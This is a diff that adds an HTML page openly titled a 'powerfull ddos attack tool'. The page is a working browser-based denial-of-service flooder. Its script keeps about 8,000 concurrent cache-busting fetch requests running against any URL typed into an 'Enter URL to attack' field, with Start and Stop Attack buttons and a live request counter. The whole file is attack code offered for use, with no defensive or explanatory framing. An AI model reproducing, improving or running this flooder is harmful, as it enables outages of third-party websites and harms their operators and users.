@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Oc Cac </title>
+    <style>
+    body {
+        font-family: 'Arial', sans-serif;
+        background-color: #f0f4f8; /* Soft blue background for comfort */
+        color: #333; /* Readable text color */
+        margin: 0; /* Reset body margin */
+        padding: 0; /* Reset body padding */
+    }
+
+    table {
+        width: 90%; /* Adjusted width for better alignment */
+        margin: 20px auto; /* Center table with auto margin */
+        border-collapse: collapse;
+        border-radius: 8px; /* Rounded corners */
+        overflow: hidden; /* Ensures the radius applies to all content */
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Slight shadow for depth */
+    }
+
+    thead {
+        background: linear-gradient(90deg, #007BFF, #0056b3); /* Gradient header */
+        color: white; /* Contrasting text */
+        font-size: 1.1em; /* Slightly larger header text */
+    }
+
+    th,
+    td {
+        text-align: left;
+        padding: 14px; /* More spacious padding */
+        border-bottom: 1px solid #ddd;
+    }
+
+    tr:nth-child(even) {
+        background-color: #f9f9f9; /* Softer grey for even rows */
+    }
+
+    tr:hover {
+        background-color: #d9f0ff; /* Brighter blue highlight on hover */
+        transition: background-color 0.3s ease-in-out; /* Smooth hover effect */
+    }
+
+    #stats {
+        width: 80%;
+        margin: auto;
+        text-align: center; /* Align content to center */
+    }
+
+    div {
+        display: flex;
+        justify-content: center;
+        gap: 10px; /* Space between items */
+        margin: 20px;
+    }
+
+    input[type="text"] {
+        width: 40%; /* More compact input */
+        padding: 12px; /* Comfortable padding */
+        border-radius: 8px; /* Rounded corners */
+        border: 1px solid #007BFF; /* Blue border */
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Shadow for input field */
+        font-size: 1em; /* Slightly larger text */
+    }
+
+    input[type="text"]:focus {
+        outline: none; /* Remove outline */
+        border-color: #0056b3; /* Darker blue focus */
+        box-shadow: 0 0 8px rgba(0, 91, 255, 0.3); /* Glow effect */
+    }
+
+    button {
+        padding: 12px 25px; /* Enhanced button size */
+        border: none;
+        background: linear-gradient(90deg, #007BFF, #0056b3); /* Gradient button */
+        color: white; /* Contrasting text */
+        font-size: 1em; /* Larger button text */
+        cursor: pointer;
+        border-radius: 8px; /* Rounded corners */
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Button shadow */
+        transition: all 0.3s ease-in-out; /* Smooth transition effects */
+    }
+
+    button:hover {
+        background: #004494; /* Even darker blue on hover */
+        transform: scale(1.05); /* Slightly increase size */
+    }
+
+    button:active {
+        background: #00336f; /* Deep blue for active state */
+        transform: scale(1); /* Reset size */
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Reduced shadow */
+    }
+</style>
+
+</head>
+<body>
+    <h1>powerfull ddos attack tool</h1>
+    <div id="controls">
+        <input type="text" id="urlInput" placeholder="Enter URL to attack" />
+        <button id="startBtn">Start Attack</button>
+        <button id="stopBtn" disabled>Stop Attack</button>
+    </div>
+    <div id="stats"></div>
+
+    <script>
+        var targets = {
+            '': { number_of_requests: 0, number_of_errored_responses: 0 },
+        };
+
+        var statsEl = document.getElementById('stats');
+        var attackRunning = false;
+        var targetUrl = '';
+        var floodPromise = null;
+
+        function printStats() {
+            statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
+                Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
+                    '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
+        }
+        setInterval(printStats, 1000);
+
+        const CONCURRENCY_LIMIT = 8000;
+        var queue = [];
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                mode: 'no-cors',
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                console.log(error.code);
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(target) {
+            for (var i = 0;; ++i) {
+                if (queue.length >= CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 28000);
+                queue.push(
+                    fetchWithTimeout(target + rand, { timeout: 1 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            targets[target].number_of_errored_responses++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targets[target].number_of_errored_responses++;
+                            }
+                            targets[target].number_of_requests++;
+                        })
+                );
+            }
+        }
+
+        function startFlood(target) {
+            if (!attackRunning) {
+                attackRunning = true;
+                targets[target] = { number_of_requests: 0, number_of_errored_responses: 0 };
+                floodPromise = flood(target);
+            }
+        }
+
+        function stopFlood() {
+            if (attackRunning) {
+                attackRunning = false;
+                queue.forEach(p => p.abort());
+                queue = [];
+                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } }; // Reset stats
+            }
+        }
+
+        document.getElementById('startBtn').addEventListener('click', () => {
+            const url = document.getElementById('urlInput').value;
+            if (url) {
+                targetUrl = url;
+                startFlood(targetUrl);
+                document.getElementById('stopBtn').disabled = false;
+                document.getElementById('startBtn').disabled = true;
+            }
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', () => {
+            stopFlood();
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('startBtn').disabled = false;
+        });
+    </script>
+</body>
+</html>
+
+
